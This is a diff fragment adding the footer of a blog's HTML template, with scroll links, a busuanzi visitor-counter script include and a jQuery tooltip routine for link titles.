+    <a href="#"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    $(document).ready(function() {
+        if ($("#comments").length < 1) {
+            $("#scroll > a:nth-child(2)").hide();
+        };
+    })
+</script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+  <script language="javascript">
+    $(function() {
+        $("a[title]").each(function() {
+            var a = $(this);
+            var title = a.attr('title');
+            if (title == undefined || title == "") return;
+            a.data('title', title).removeAttr('title').hover(
+
+            function() {
+                var offset = a.offset();
+                $("<div id=\"anchortitlecontainer\"></div>").appendTo($("body")).html(title).css({
+                    top: offset.top - a.outerHeight() - 15,
+                    left: offset.left + a.outerWidth()/2 + 1
+                }).fadeIn(function() {
+                    var pop = $(this);
+                    setTimeout(function() {
+                        pop.remove();
+                    }, pop.text().length * 800);
+                });
+            }, function() {
+                $("#anchortitlecontainer").remove();
+            });
+        });
+    });
+</script>
+
+
+  </div>
+</body>
+</html>
